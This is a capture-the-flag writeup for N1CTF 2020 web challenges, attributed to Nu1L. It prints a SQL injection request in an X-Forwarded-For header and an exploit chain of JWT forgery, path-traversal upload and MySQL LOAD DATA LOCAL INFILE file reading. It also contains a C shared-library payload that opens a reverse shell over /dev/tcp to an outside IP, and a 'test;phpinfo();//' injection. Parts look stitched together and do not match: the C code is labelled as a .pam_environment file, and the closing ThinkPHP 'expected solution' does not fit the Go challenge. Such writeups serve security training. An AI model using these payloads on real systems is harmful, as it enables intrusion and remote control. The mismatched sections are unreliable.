# N1CTF 2020 Writeup
## Author: Nu1L Team

### WEB Challenges

#### Signin
- **Payload**:
  ```
  GET /?input=O%3A4%3A%22flag%22%3A1%3A%7Bs%3A2%3A%22ip%22%3BO%3A2%3A%22ip%22%3A0%3A%7B%7D%7D HTTP/1.1
  Host: 101.32.205.189
  Pragma: no-cache
  Cache-Control: no-cache
  Upgrade-Insecure-Requests: 1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
  Accept-Encoding: gzip, deflate
  X-Forwarded-For: 123.123.123.13' or updatexml(1,concat(0x7e,(select if((select substr(version(),2,1)='.'),'n1ctf',1))),0) or '
  Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
  Connection: close
  ```

- **Note**: The key is in the database, but a simple `SELECT key FROM n1key` will not reveal it. Why?

#### GinDriver
- **Design**:
  - This challenge is divided into two parts: GinDriver and GinDriver Revenge.
  - **Inspiration**: Inspired by a trick discovered by plusls, which can lead to Remote Code Execution (RCE) by uploading a malicious dynamic-link library and `.pam_environment` file to bypass the SSHD mechanism (inspired by CVE-2015-8325).
  - **GinDriver**:
    - Misuse of JWT signing mechanism leading to identity forgery.
    - Overwriting config files through file uploads to launch a MySQL client `LOAD DATA LOCAL INFILE` attack, gaining arbitrary file reading.
  - **GinDriver Revenge**:
    - A reverse shell can be triggered when the SSH server accepts a new connection by uploading a `.pam_environment` file to inject the `LD_PRELOAD` environment, pointing to a malicious dynamic-link library.

- **Information Gathering**:
  - Backend service developed using Golang and the Gin framework.
  - Frontend developed using Umi and React.
  - Uses Webauthn for user authentication.
  - Authenticated users are redirected to the file upload section, which is accessible only to admins.

- **Webauthn**:
  - **Registration Flow**:
    1. Relying Party Server sends a challenge, user info, and relying party info to the browser.
    2 - 6. The browser and authenticator handle the registration process, generating a public key and credential ID.
  - **Authentication Flow**:
    1. Relying Party Server sends a challenge to the browser.
    2 - 6. The browser and authenticator handle the authentication process, creating an assertion.
  - **Key Role**: Public keys replace passwords in Webauthn authentication.

- **Reverse Engineering**:
  - Using IDA, the internal logic can be analyzed.
  - **Critical Point**: The `LoginRequired` middleware decodes the `Authorization` header, gets JWT payloads, and checks the signature using the user-specific Webauthn public key.
  - **Static Router**:
    - `GET /pubkeys/ -> ./public/pubkeys`
  - **API Router**:
    - `POST /api/auth/register/begin`
    - `PATCH /api/auth/register/:name/finish`
    - `GET /api/auth/login/:name/begin`
    - `PATCH /api/auth/login/:name/finish`
  - **Login Required Router**:
    - `GET /api/user/:name`
    - `POST /api/user/file/upload`
  - **File Upload Vulnerability**: Path traversal vulnerability allows uploading arbitrary files to any location with sufficient write permissions.
  - **Auto Reload and Migration**: Configured to auto-reload the config file and execute database auto-migration.

- **Exploit Chain**:
  1. Identity Forgery
  2. Arbitrary File Uploading
  3. Overwrite Config File
  4. Database Auto Migration
  5. MySQL `LOAD DATA LOCAL INFILE`
  6. Arbitrary File Reading

- **Identity Forgery**:
  - Use the public key of `admin` to forge a JWT token, gaining file upload access.
  - Note: There's a newline (`\n`) in the `admin.pub` file.
  - Forge the admin JWT token using `jwt.io`, add it to the `Authorization` header, and send via Burp to confirm.

- **Arbitrary File Uploading**:
  - After forging the admin JWT token, upload a config file to overwrite the existing one, triggering the database auto-migration and MySQL `LOAD DATA LOCAL INFILE`.

- **Arbitrary File Reading**:
  - Trigger MySQL `LOAD DATA LOCAL INFILE` to read the flag under `/flag`.

- **Get Shell**:
  - Upload the public key to `~/.ssh/authorized_keys` to access the server via OpenSSH.
  - Write to `~/.pam_environment` and upload a malicious file `/tmp/exp.so`.
  - Example `~/.pam_environment`:
    ```c
    #include <stdlib.h>
    #include <unistd.h>

    void getShell() __attribute__((constructor));

    void getShell() {
        char *argv[] = {
            "/bin/sh",
            "-c",
            "/bin/bash -c \"/bin/bash -i >& /dev/tcp/114.5.1.4/1919 0>&1\"",
            NULL
        };
        execve("/bin/sh", argv, NULL);
    }
    ```

- **Security Measures**:
  - Only the `public` directory is writable.
  - `chown -R root:root /var/www/html`
  - `chmod -R 755 /var/www/html`
  - `chmod 777 /var/www/html/public`

- **Expected Solution**:
  - Use the method `\think\Build::buildHello` indirectly through the `module` method.
  - Control the first parameter `$module` and partially control the writing content.
  - Bypass method: `test;phpinfo();//` and then use `include` to get a shell.
  - In actual combat, the application directory may not have write permission unless it is on Windows.

This writeup provides a detailed breakdown of the steps and techniques used to solve the `GinDriver` and `GinDriver Revenge` challenges in the N1CTF 2020 competition.